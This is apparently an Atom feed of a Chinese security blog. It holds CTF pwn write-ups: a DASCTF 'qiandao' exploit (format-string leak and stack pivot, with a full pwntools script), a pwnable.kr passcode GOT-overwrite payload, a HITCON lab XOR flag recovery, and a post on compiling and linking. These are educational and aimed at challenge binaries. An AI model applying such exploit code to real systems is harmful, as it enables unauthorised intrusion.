<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zer0_1s</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://zer0_1s.gitee.io/"/>
  <updated>2020-07-29T14:55:29.733Z</updated>
  <id>https://zer0_1s.gitee.io/</id>
  
  <author>
    <name>zer0_1s</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DASCTF 7月</title>
    <link href="https://zer0_1s.gitee.io/2020/07/29/DASCTF%207%E6%9C%88/"/>
    <id>https://zer0_1s.gitee.io/2020/07/29/DASCTF%207%E6%9C%88/</id>
    <published>2020-07-29T12:19:04.995Z</published>
    <updated>2020-07-29T14:55:29.733Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="DASCTF-七月pwn复现"><a href="#DASCTF-七月pwn复现" class="headerlink" title="DASCTF | 七月pwn复现"></a>DASCTF | 七月pwn复现</h2><h3 id="qiandao-格式化字符串-栈溢出"><a href="#qiandao-格式化字符串-栈溢出" class="headerlink" title="qiandao | 格式化字符串+栈溢出"></a>qiandao | 格式化字符串+栈溢出</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chen@ubuntu:~/Desktop$ checksec qiandao</span><br><span class="line"></span><br><span class="line">[*] <span class="string">'/home/chen/Desktop/qiandao'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200729213926.jpg" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gets(&amp;s);</span><br><span class="line"><span class="built_in">printf</span>(&amp;s);<span class="comment">//格式化字符串漏洞，泄露栈上的信息</span></span><br><span class="line">...</span><br><span class="line">gets(&amp;v4);<span class="comment">//no canary 所以存在栈溢出</span></span><br></pre></td></tr></table></figure><p><strong>在main函数结尾发现已下的汇编代码，对汇编代码的分析很关键</strong><br><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200729213715.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:080485FD                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048600                 leave</span><br><span class="line">.text:08048601                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048604                 retn</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200729215532.jpg" alt=""></p><ul><li>这段汇编决定了直接栈溢出无效，关键就在于esp被改变</li><li>mov     ecx, [ebp+var_4],ecx=(ebp-0x4)地址中的内容赋值</li><li>lea esp,[ecx-4]可以认为是mov esp,ecx-0x4即esp=ecx-0x4，esp指针被控制则会影响ret</li><ul><strong>采用gdb-peda辅助分析</strong><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ECX: 0xf7fb75a0 --&gt; 0xfbad208b    &#x2F;&#x2F;执行mov     ecx, [ebp+var_4]之前</span><br><span class="line">EDX: 0xf7fb887c --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">EDI: 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">EBP: 0xffffd068 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd040 --&gt; 0x61 (&#39;a&#39;)</span><br><span class="line">...</span><br><span class="line">ECX: 0xffffd080 --&gt; 0x1     &#x2F;&#x2F;执行mov     ecx, [ebp+var_4]之后 </span><br><span class="line">EDX: 0xf7fb887c --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">EDI: 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">EBP: 0xffffd068 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd040 --&gt; 0x61 (&#39;a&#39;)</span><br><span class="line">···</span><br><span class="line">gdb-peda$ stack 30</span><br><span class="line">0000| 0xffffd040 --&gt; 0x61 (&#39;a&#39;)</span><br><span class="line">0004| 0xffffd044 --&gt; 0x0 </span><br><span class="line">0008| 0xffffd048 --&gt; 0xf7e35840 (add    ebx,0x1817c0)</span><br><span class="line">0012| 0xffffd04c --&gt; 0x804865b (&lt;__libc_csu_init+75&gt;:add    edi,0x1)</span><br><span class="line">0016| 0xffffd050 --&gt; 0x61 (&#39;a&#39;)</span><br><span class="line">0020| 0xffffd054 --&gt; 0xffffd114 --&gt; 0xffffd2e9 (&quot;&#x2F;home&#x2F;chen&#x2F;Desktop&#x2F;qiandao&quot;)</span><br><span class="line">0024| 0xffffd058 --&gt; 0xffffd11c --&gt; 0xffffd304 (&quot;XDG_VTNR&#x3D;7&quot;)</span><br><span class="line">0028| 0xffffd05c --&gt; 0x8048631 (&lt;__libc_csu_init+33&gt;:lea    eax,[ebx-0xf8])</span><br><span class="line">0032| 0xffffd060 --&gt; 0xf7fb73dc --&gt; 0xf7fb81e0 --&gt; 0x0 </span><br><span class="line">0036| 0xffffd064 --&gt; 0xffffd080 --&gt; 0x1 &#x2F;&#x2F;EBP-4 ，ecx&#x3D;(ebp-0x4)地址中的内容赋值</span><br><span class="line">0040| 0xffffd068 --&gt; 0x0    &#x2F;&#x2F;EBP</span><br><span class="line">0044| 0xffffd06c --&gt; 0xf7e1f647 (&lt;__libc_start_main+247&gt;:add    esp,0x10)</span><br><span class="line">0048| 0xffffd070 --&gt; 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">0052| 0xffffd074 --&gt; 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">0056| 0xffffd078 --&gt; 0x0 </span><br><span class="line">0060| 0xffffd07c --&gt; 0xf7e1f647 (&lt;__libc_start_main+247&gt;:add    esp,0x10)</span><br><span class="line">0064| 0xffffd080 --&gt; 0x1    &#x2F;&#x2F;ECX</span><br></pre></td></tr></table></figure><p><strong>接下来 leave,则mov esp,ebp=&gt;esp=ebp=0xffffd068,pop ebp之后esp=0xffffd06c,之后esp=ecx-0x4= [ebp+var_4]-0x4(此处ebp=0xffffd068)，转化一下就是esp= [0xffffd064]-0x4,esp=var_4（在栈上可以覆盖）的内容-0x4，</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ./qiandao</span><br><span class="line">disas main</span><br><span class="line">b * 0x080485d1</span><br></pre></td></tr></table></figure><p><strong>在printf(&amp;s);处下断点，便于观察输入在栈上的位置</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ stack 30</span><br><span class="line">0000| 0xffffd030 --&gt; 0xffffd050 (&quot;%p%p%p%p%p%p&quot;)</span><br><span class="line">0004| 0xffffd034 --&gt; 0xf7fb7000 --&gt; 0x1afdb0 &#x2F;&#x2F;第一个%p&#x3D;&gt;0xf7fb7000</span><br><span class="line">0008| 0xffffd038 --&gt; 0xffffd068 --&gt; 0x0   &#x2F;&#x2F;第二个%p&#x3D;&gt;0xffffd068&#x3D;ebp&#x3D;&gt;%2$p</span><br><span class="line">0012| 0xffffd03c --&gt; 0x80485ab (&lt;main+22&gt;:sub    esp,0xc)</span><br><span class="line">0016| 0xffffd040 --&gt; 0x1   &#x2F;&#x2F;ebp-0x28 gets(&amp;s)第二次输入点[0xffffd064]-0x4</span><br><span class="line">0020| 0xffffd044 --&gt; 0x0  &#x2F;&#x2F;ebp-0x24  [0xffffd06c]&#x3D; 0xffffd044&#x3D;&gt;                       </span><br><span class="line">0024| 0xffffd048 --&gt; 0xf7e35840 (add    ebx,0x1817c0)</span><br><span class="line">0028| 0xffffd04c --&gt; 0x804865b (&lt;__libc_csu_init+75&gt;:add    edi,0x1)</span><br><span class="line">0032| 0xffffd050 (&quot;%p%p%p%p%p%p&quot;)</span><br><span class="line">0036| 0xffffd054 (&quot;%p%p%p%p&quot;)</span><br><span class="line">0040| 0xffffd058 (&quot;%p%p&quot;)</span><br><span class="line">0044| 0xffffd05c --&gt; 0x8048600 (&lt;main+107&gt;:leave)</span><br><span class="line">0048| 0xffffd060 --&gt; 0xf7fb73dc --&gt; 0xf7fb81e0 --&gt; 0x0 </span><br><span class="line">0052| 0xffffd064 --&gt; 0xffffd080 --&gt; 0x1 </span><br><span class="line">0056| 0xffffd068 --&gt; 0x0 </span><br><span class="line">0060| 0xffffd06c --&gt; 0xf7e1f647 (&lt;__libc_start_main+247&gt;:add    esp,0x10)</span><br><span class="line">0064| 0xffffd070 --&gt; 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">0068| 0xffffd074 --&gt; 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">0072| 0xffffd078 --&gt; 0x0 </span><br><span class="line">0076| 0xffffd07c --&gt; 0xf7e1f647 (&lt;__libc_start_main+247&gt;:add    esp,0x10)</span><br><span class="line">0080| 0xffffd080 --&gt; 0x1 </span><br><span class="line">0084| 0xffffd084 --&gt; 0xffffd114 --&gt; 0xffffd2e9 (&quot;&#x2F;home&#x2F;chen&#x2F;Desktop&#x2F;qiandao&quot;)</span><br><span class="line">0088| 0xffffd088 --&gt; 0xffffd11c --&gt; 0xffffd304 (&quot;XDG_VTNR&#x3D;7&quot;)</span><br><span class="line">0092| 0xffffd08c --&gt; 0x0 </span><br><span class="line">0096| 0xffffd090 --&gt; 0x0 </span><br><span class="line">--More--(25&#x2F;30)</span><br><span class="line">0100| 0xffffd094 --&gt; 0x0 </span><br><span class="line">0104| 0xffffd098 --&gt; 0xf7fb7000 --&gt; 0x1afdb0 </span><br><span class="line">0108| 0xffffd09c --&gt; 0xf7ffdc04 --&gt; 0x0 </span><br><span class="line">0112| 0xffffd0a0 --&gt; 0xf7ffd000 --&gt; 0x23f40 </span><br><span class="line">0116| 0xffffd0a4 --&gt; 0x0</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10019</span>)</span><br><span class="line">p=process(<span class="string">'./qiandao'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line">p.recvuntil(<span class="string">"what's your name:\n"</span>)<span class="comment"># this is an error \n</span></span><br><span class="line"><span class="comment">#payload=0x24*'a'+p32(ebp)+'bbbb'+p32(0x804857d)</span></span><br><span class="line">p.sendline(<span class="string">"%2$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">addr=int(p.recvuntil(<span class="string">'\n'</span>).strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">print(hex(addr))</span><br><span class="line">back_door=<span class="number">0x804857d</span></span><br><span class="line">payload=p32(back_door)+<span class="string">'a'</span>*<span class="number">0x20</span>+p32(addr<span class="number">-0x24</span>)<span class="comment"># use addr var_4 to get backdoor on the stack </span></span><br><span class="line">p.recvuntil(<span class="string">"Can you solve this sign-in problem?\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>本地</strong><br><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200729224012.jpg" alt=""><br><strong>远程：提交flag还要去掉flag{},呵呵</strong><br><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200729225341.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;DASCTF-七月pwn复现&quot;&gt;&lt;a href=&quot;#DASCTF-七月pwn复现&quot; class=&quot;headerlink&quot; title=&quot;DASCTF | 七月pwn复现&quot;&gt;&lt;/a&gt;DASCTF | 七月pwn复现&lt;/h2&gt;&lt;h3 id=&quot;qiandao-
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>pwnable.kr</title>
    <link href="https://zer0_1s.gitee.io/2020/07/25/pwnable.kr/"/>
    <id>https://zer0_1s.gitee.io/2020/07/25/pwnable.kr/</id>
    <published>2020-07-25T12:19:14.341Z</published>
    <updated>2020-07-27T12:02:37.864Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="Pwnable-kr"><a href="#Pwnable-kr" class="headerlink" title="Pwnable.kr "></a>Pwnable.kr </h2><h3 id="password-amp-延迟绑定"><a href="#password-amp-延迟绑定" class="headerlink" title="password&amp;延迟绑定"></a>password&amp;延迟绑定</h3><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194031.jpg" alt=""></p><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727193918.jpg" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">       <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">               system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></hr><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chen@ubuntu:~$ gcc -g -m32  -o passcode passcode.c</span><br><span class="line">passcode.c: In <span class="keyword">function</span> ‘login’:</span><br><span class="line">passcode.c:9:8: warning: format ‘%d’ expects argument of <span class="built_in">type</span> ‘int *’, but argument 2 has <span class="built_in">type</span> ‘int’ [-Wformat=]</span><br><span class="line">scanf(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">       ^</span><br><span class="line">passcode.c:14:15: warning: format ‘%d’ expects argument of <span class="built_in">type</span> ‘int *’, but argument 2 has <span class="built_in">type</span> ‘int’ [-Wformat=]</span><br><span class="line">        scanf(<span class="string">"%d"</span>, passcode2);</span><br><span class="line">              ^</span><br></pre></td></tr></table></figure></hr><strong>在源码的scanf()，name和passcode1处下断点</strong><pre><code>EBP: 0xffffd068 --&gt; 0xffffd078 --&gt; 0x0</code></pre></hr><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727200200.jpg" alt=""></p><p><strong>可以向某个地址写入，scanf(“%d”,passcode);</strong></p><pre><code>080486b5 &lt;main&gt;:...80486d6:    e8 7d ff ff ff           call   8048658 &lt;welcome&gt; 80486db:    e8 bb fe ff ff           call   804859b &lt;login&gt;... char name[100]; // [esp+8h] [ebp-70h]int passcode1; // [esp+8h] [ebp-10h]int passcode2; // [esp+Ch] [ebp-Ch].got.plt:0804A010 off_804A010     dd offset fflush        ; DATA XREF: _fflush↑r</code></pre><p><strong>两函数相邻，共用一个ebp，所以name距离passcode为<code>0x60</code>，而name限制输入100个，恰好多4字节覆盖passcode1,而passcode1是地址，scanf将输入的数写如某个地址，地址可控，找到某一个函数的GOT表，进行覆写，覆写passcode为0x0804A010之后再输入时,在向GOT中写入目标函数地址</strong></p><pre><code>stack—addr--&gt;0x0804A010--&gt;目标函数地址0x0804A10通过scanf(&quot;%100s&quot;,name)修改,目标地址通过scanf(&quot;%d&quot;,passcode1)修改&lt;/hr&gt;payload=&apos;a&apos;*0x60+p32(0x0804A010)payload1=str(134514202) #Login OK的代码段地址</code></pre><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194111.jpg" alt=""></p><p><strong>本地是没有flag的</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;Pwnable-kr&quot;&gt;&lt;a href=&quot;#Pwnable-kr&quot; class=&quot;headerlink&quot; title=&quot;Pwnable.kr &quot;&gt;&lt;/a&gt;Pwnable.kr &lt;/h2&gt;&lt;h3 id=&quot;password-amp-延迟绑定&quot;&gt;&lt;a href
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Hitcon-Training</title>
    <link href="https://zer0_1s.gitee.io/2020/07/23/Hitcon-Training/"/>
    <id>https://zer0_1s.gitee.io/2020/07/23/Hitcon-Training/</id>
    <published>2020-07-23T02:04:52.649Z</published>
    <updated>2020-07-28T04:16:34.207Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="Hitcon-training"><a href="#Hitcon-training" class="headerlink" title="Hitcon-training"></a>Hitcon-training</h2><pre><code>git clone https://github.com/scwuaptx/HITCON-Training.git</code></pre><p><strong>已有环境，git克隆到当前目录</strong></p><h2 id="HITCON"><a href="#HITCON" class="headerlink" title="HITCON"></a>HITCON</h2><h3 id="lab1-多种解法"><a href="#lab1-多种解法" class="headerlink" title="lab1 | 多种解法"></a>lab1 | 多种解法</h3><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200728100332.png" alt=""></p><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194343.png" alt=""></p><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194348.png" alt=""></p><p><strong>buf=v2，则异或打印flag，但是buf无法被v2覆盖，所以无法从输入端控制，但是异或的v54的用char显示，根据小端模式，推知Do_y，即输入（0x44 6F5F79）=&gt;0x795f6f44(内存中/栈中)=&gt;(y_oD),所以用python复原字符串</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list=[<span class="number">0x795f6f44</span>,<span class="number">0x6B5F756F</span>,<span class="number">0x5F776F6E</span>,<span class="number">0x5F796877</span>,<span class="number">0x745F796D</span>,<span class="number">0x6D6D6165</span>,<span class="number">0x5F657461</span>,<span class="number">0x6E61724F</span>, <span class="number">0x695F6567</span>,<span class="number">0x6F735F73</span>,<span class="number">0x676E615F</span>,<span class="number">0x3F3F7972</span>] <span class="comment">#0x3f</span></span><br><span class="line">str=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">str+=chr(i%<span class="number">0x100</span>)</span><br><span class="line">str+=chr(int(i%<span class="number">0x10000</span>/<span class="number">0x100</span>))</span><br><span class="line">str+=chr(int(i%<span class="number">0x1000000</span>/<span class="number">0x10000</span>))</span><br><span class="line">str+=chr(int((i%<span class="number">0x100000000</span>/<span class="number">0x1000000</span>)))</span><br><span class="line">str+=chr(<span class="number">0x3f</span>)</span><br><span class="line">print(str)</span><br></pre></td></tr></table></figure><p><strong>以上是python对字符串的复原，复原即下方的key</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="keyword">char</span> key[] = <span class="string">"Do_you_know_why_my_teammate_Orange_is_so_angry???"</span>;</span><br><span class="line"><span class="keyword">char</span> cipher[] = &#123;<span class="number">7</span>, <span class="number">59</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">61</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">40</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">85</span>, <span class="number">22</span>, <span class="number">8</span>, <span class="number">31</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">28</span>, <span class="number">62</span>, <span class="number">10</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">107</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">60</span>, <span class="number">44</span>, <span class="number">91</span>, <span class="number">49</span>, <span class="number">85</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">76</span>, <span class="number">30</span>, <span class="number">66</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="keyword">sizeof</span>(cipher) ; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>,cipher[i]^key[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727195914.png" alt=""></p><p><strong>还可以gdb调试</strong></p><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727193717.jpg" alt=""></p><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200728101628.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;Hitcon-training&quot;&gt;&lt;a href=&quot;#Hitcon-training&quot; class=&quot;headerlink&quot; title=&quot;Hitcon-training&quot;&gt;&lt;/a&gt;Hitcon-training&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;git c
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>prelink</title>
    <link href="https://zer0_1s.gitee.io/2020/07/20/prelink/"/>
    <id>https://zer0_1s.gitee.io/2020/07/20/prelink/</id>
    <published>2020-07-20T11:07:07.973Z</published>
    <updated>2020-07-27T11:54:19.790Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="编译与链接"><a href="#编译与链接" class="headerlink" title="编译与链接"></a>编译与链接</h2><h3>被隐藏的过程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$gcc</span> hello.c</span><br><span class="line">$./a.out</span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure><strong>从源代码到可执行程序之间发生了什么？</strong><h3 id="第一步-预编译"><a href="#第一步-预编译" class="headerlink" title="第一步|预编译"></a>第一步|预编译</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i                 <span class="comment">#C</span></span><br><span class="line">cpp hello.c &gt; hello.i                    <span class="comment">#C++</span></span><br></pre></td></tr></table></figure><ul><li>删除#define,展开对应的宏定义</li><li>处理条件预编译指令，#if,#ifdef,#else等</li><li>递归讲#include包含文件插入对应位置</li><li>删除注释，添加行号，文件明标识，方便调试</li><li>保留下面编译用的#prama编译器指令</li></ul><h3 id="第二步-编译"><a href="#第二步-编译" class="headerlink" title="第二步 | 编译"></a>第二步 | 编译</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -S hello.i -o hello.s</span><br><span class="line">cc1 hello.c                <span class="comment">#合并预编译，编译</span></span><br><span class="line">gcc -S hello.c -o hello.s  <span class="comment">#合并预编译，编译</span></span><br></pre></td></tr></table></figure><p><strong>对预处理的文件词法，语法，语义分析，并优化</strong></p><h3 id="第三步-汇编"><a href="#第三步-汇编" class="headerlink" title="第三步 | 汇编"></a>第三步 | 汇编</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">as hello.s -o hello.o  <span class="comment">#as 是汇编器</span></span><br><span class="line">gcc -c hello.s -o hello.o </span><br><span class="line">gcc -c hello.c -o hello.o <span class="comment">#产生目标文件</span></span><br></pre></td></tr></table></figure><p><strong>从汇编代码到机器指令</strong></p><h3 id="第四步-链接"><a href="#第四步-链接" class="headerlink" title="第四步 | 链接"></a>第四步 | 链接</h3><p><strong>简单来说：链接器是将很多的目标文件（.o）链接起来</strong></p><h2 id="编译-了解一下"><a href="#编译-了解一下" class="headerlink" title="编译  | 了解一下"></a>编译  | 了解一下</h2><pre><code>array[index]=（index+4）*(2+6);</code></pre><h4 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h4><p><strong>扫描器扫描分割，比如array是标识符，[是左括号等等，C语言的宏展开交给独立的预处理器。</strong></p><h4 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h4><p><strong>语法分析器已表达式为节点，构建语法分析树。</strong></p><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194407.jpg" alt=""></p><h4 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h4><p><strong>静态语义分析：声明，类型匹配，类型转换</strong></p><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194418.jpg" alt=""></p><h4 id="源码优化-amp-目标代码生成及优化"><a href="#源码优化-amp-目标代码生成及优化" class="headerlink" title="源码优化&amp;目标代码生成及优化"></a>源码优化&amp;目标代码生成及优化</h4><p><strong>源码优化：比如2+6被优化成8，目标代码生成及优化：删除多余指令，是有合适的寻址方式等等。</strong></p><h2 id="链接-略懂略懂"><a href="#链接-略懂略懂" class="headerlink" title="链接 | 略懂略懂"></a>链接 | 略懂略懂</h2><h4 id="历史久远-从纸带说起"><a href="#历史久远-从纸带说起" class="headerlink" title="历史久远 | 从纸带说起"></a>历史久远 | 从纸带说起</h4><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194427.jpg" alt=""></p><p><strong>上图就是纸带，左侧是行号，试想要是插入指令在某一行，对应的在其中的目标地址就要全部重新算，这个过程即是重定位，由于地址是数字，变化会很复杂，所以才去地址符号化策略，譬如’foo’，无论实际地址如何变化，在编译时会重新计算’foo’地址，将引用到’foo’的指令修正到正确地址；</strong></p><h4 id="静态链接-模块拼装"><a href="#静态链接-模块拼装" class="headerlink" title="静态链接 | 模块拼装"></a>静态链接 | 模块拼装</h4><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194435.jpg" alt=""></p><h4 id="重定位-地址"><a href="#重定位-地址" class="headerlink" title="重定位 | 地址"></a>重定位 | 地址</h4><p><strong>比如a模块用b模块的var变量，var=0x1,编译a时，var的地址为0x00 00 00 00（因为不知道实际地址），之后链接器会讲正确地址覆盖0x00 00 00 00,每个修正的地方叫重定位入口。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;编译与链接&quot;&gt;&lt;a href=&quot;#编译与链接&quot; class=&quot;headerlink&quot; title=&quot;编译与链接&quot;&gt;&lt;/a&gt;编译与链接&lt;/h2&gt;&lt;h3&gt;被隐藏的过程&lt;/h3&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;t
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://zer0_1s.gitee.io/2020/07/09/hello-world/"/>
    <id>https://zer0_1s.gitee.io/2020/07/09/hello-world/</id>
    <published>2020-07-09T15:25:33.028Z</published>
    <updated>2020-07-27T10:02:24.737Z</updated>
    
